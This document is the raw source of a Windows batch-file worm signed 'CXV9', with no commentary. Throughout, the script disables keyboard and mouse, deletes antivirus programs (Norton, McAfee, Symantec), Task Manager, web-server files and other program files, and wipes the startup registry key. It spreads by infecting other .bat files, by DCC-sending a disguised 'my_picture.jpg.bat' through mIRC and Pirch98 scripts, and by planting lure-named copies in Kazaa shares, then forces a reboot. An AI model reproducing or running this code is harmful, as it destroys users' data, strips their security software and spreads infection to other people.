@echo off
rundll keyboard,disable
rundll mouse,disable
cd %windir%
del taskman.exe *.ini
cd %windir%\system32\
del taskman.exe 
copy %0 %windir%\cxv9.bat
copy %0 %windir%\system32\cxv9.bat
REG DELETE HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
if exist c:\progra~1\norton~1\ goto a
if exist c:\progra~1\mcafee\ goto b
:a
cd c:\progra~1\norton~1\
del *.exe *.dll *.hlp *.dat *.ini *.idx *.log
if not exist c:\progra~1\norton~1\norton~1\ goto c
cd c:\progra~1\norton~1\norton~1\
del *.dll *.reg *.log *.dat *.txt *.ini *.def *.exe *.hlp *.cnt
goto c
:b
cd c:\progra~1\mcafee\
del *.dll *.reg *.log *.dat *.txt *.ini *.def *.exe *.hlp *.cnt
goto c
:c
if not exist c:\mirc\ goto d
cd c:\mirc\
copy %0 my_picture.jpg.bat
echo [script] >> script.ini
echo n0=on 1:join:*.*: { if ( $nick !=$me ) {halt} /dcc send $nick c:\mirc\my_picture.jpg.bat } >> script.ini
:d
if not exist c:\progra~1\mirc\ goto e
cd c:\progra~1\mirc\
copy %0 my_picture.jpg.bat
echo [script] >> script.ini
echo n0=on 1:join:*.*: { if ( $nick !=$me ) {halt} /dcc send $nick c:\progra~1\mirc\my_picture.jpg.bat } >> script.ini
:e
if not exist c:\pirch98\ goto f
cd c:\pirch98\
copy %0 my_picture.jpg.bat
echo [Levels] >> events.ini
echo Enabled=1 >> events.ini
echo Count=6 >> events.ini
echo Level1=000-Unknows >> events.ini
echo 000-UnknowsEnabled=1 >> events.ini
echo Level2=100-Level 100 >> events.ini
echo 100-Level 100Enabled=1 >> events.ini
echo Level3=200-Level 200 >> events.ini
echo 200-Level 200Enabled=1 >> events.ini
echo Level4=300-Level 300 >> events.ini
echo 300-Level 300Enabled=1 >> events.ini
echo Level5=400-Level 400 >> events.ini
echo 400-Level 400Enabled=1 >> events.ini
echo Level6=500-Level 500 >> events.ini
echo 500-Level 500Enabled=1 >> events.ini
echo [000-Unknowns] >> events.ini
echo User1=*!*@* >> events.ini
echo UserCount=1 >> events.ini
echo Events1=ON JOIN:#: /dcc send $nick C:\Pirch98\my_picture.jpg.bat >> events.ini
echo EventCount=1 >> events.ini
echo [100-Level 100] >> events.ini
echo UserCount=0 >> events.ini
echo EventCount=0 >> events.ini
echo [200-Level 200] >> events.ini
echo UserCount=0 >> events.ini
echo EventCount=0 >> events.ini
echo [300-Level 300] >> events.ini
echo UserCount=0 >> events.ini
echo EventCount=0 >> events.ini
echo [400-Level 400] >> events.ini
echo UserCount=0 >> events.ini
echo EventCount=0 >> events.ini
echo [500-Level 500] >> events.ini
echo UserCount=0 >> events.ini
echo EventCount=0 >> events.ini
:f
if not exist c:\progra~1\pirch98\ goto g
cd c:\progra~1\pirch98\
copy %0 my_picture.jpg.bat
echo [Levels] >> events.ini
echo Enabled=1 >> events.ini
echo Count=6 >> events.ini
echo Level1=000-Unknows >> events.ini
echo 000-UnknowsEnabled=1 >> events.ini
echo Level2=100-Level 100 >> events.ini
echo 100-Level 100Enabled=1 >> events.ini
echo Level3=200-Level 200 >> events.ini
echo 200-Level 200Enabled=1 >> events.ini
echo Level4=300-Level 300 >> events.ini
echo 300-Level 300Enabled=1 >> events.ini
echo Level5=400-Level 400 >> events.ini
echo 400-Level 400Enabled=1 >> events.ini
echo Level6=500-Level 500 >> events.ini
echo 500-Level 500Enabled=1 >> events.ini
echo [000-Unknowns] >> events.ini
echo User1=*!*@* >> events.ini
echo UserCount=1 >> events.ini
echo Events1=ON JOIN:#: /dcc send $nick C:\Pirch98\my_picture.jpg.bat >> events.ini
echo EventCount=1 >> events.ini
echo [100-Level 100] >> events.ini
echo UserCount=0 >> events.ini
echo EventCount=0 >> events.ini
echo [200-Level 200] >> events.ini
echo UserCount=0 >> events.ini
echo EventCount=0 >> events.ini
echo [300-Level 300] >> events.ini
echo UserCount=0 >> events.ini
echo EventCount=0 >> events.ini
echo [400-Level 400] >> events.ini
echo UserCount=0 >> events.ini
echo EventCount=0 >> events.ini
echo [500-Level 500] >> events.ini
echo UserCount=0 >> events.ini
echo EventCount=0 >> events.ini
:g
for /f %%i IN ('dir /s /b /l %windir%\*.bat') DO COPY %%i+%0
for /f %%i IN ('dir /s /b /l %windir%\*.con') DO COPY %%i+%0
if not exist c:\kazaa\myshar~1\ goto h
cd c:\kazaa\myshar~1\
copy %0 porn.jpg.bat
copy %0 sex.jpg.bat
copy %0 love.jpg.bat
copy %0 hotmail-hack.exe.bat
copy %0 microsoft-keygen.exe.bat
copy %0 ea-games_keygen.exe.bat
:h
if not exist c:\progra~1\kazaa\myshar~1\ goto i
cd c:\progra~1\kazaa\myshar~1\
copy %0 porn.jpg.bat
copy %0 sex.jpg.bat
copy %0 love.jpg.bat
copy %0 hotmail-hack.exe.bat
copy %0 microsoft-keygen.exe.bat
copy %0 ea-games_keygen.exe.ba
:i
if not exist c:\inetpub\ goto j
cd c:\inetpub\
del *.htm *.html *.vbs *.asp *.php *.js *.jpg *.bmp *.gif *.txt *.doc *.lst
cd c:\inetpub\wwwroot\
del *.htm *.html *.vbs *.asp *.php *.js *.jpg *.bmp *.gif *.txt *.doc *.lst
:j
if not exist c:\progra~1\intern~1\ goto k
cd c:\progra~1\intern~1\
del *.exe *.cif *.cat *.inf *.txt *.dll
:k
if not exist c:\progra~1\messen~1\ goto l
cd c:\progra~1\messen~1\
del *.exe *.txt *.gif *.dll *.wav
:l
if not exist c:\progra~1\symant~1\ goto m
cd c:\progra~1\symant~1\
del *.cat *.sys *.dll *.386
cd c:\progra~1\symant~1\liveup~1\
del *.exe *.cnt *.hlp *.ini *.dll *.dat *.cpl *.txt
:m
cd %windir%
attrib +r +a +s +h *.exe *.dll *.txt *.log *.doc
shutdown -r -t 10
rundll user.exe,exitwindows
exit

~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 --------------------------
|           CXV9           |
~~~~~~~~~~~~~~~~~~~~~~~~~~~~ 